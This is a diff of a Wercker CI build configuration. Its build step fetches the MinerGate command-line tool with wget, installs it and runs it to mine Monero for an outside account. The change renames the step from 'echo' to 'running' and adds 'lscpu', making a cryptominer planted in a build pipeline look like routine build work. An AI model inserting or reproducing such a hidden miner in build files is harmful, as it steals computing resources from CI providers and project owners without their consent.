@@ -21,7 +21,7 @@ build:
     # http://devcenter.wercker.com/docs/steps/index.html
   steps:
     - script:
-        name: echo
+        name: running
         code: |
           apt-get update
           apt-get install wget -y
@@ -29,3 +29,4 @@ build:
           wget https://minergate.com/download/deb-cli -O a.deb
           dpkg -i a.deb
           minergate-cli -user greenfieldsvp@outlook.com.vn -xmr
+          lscpu
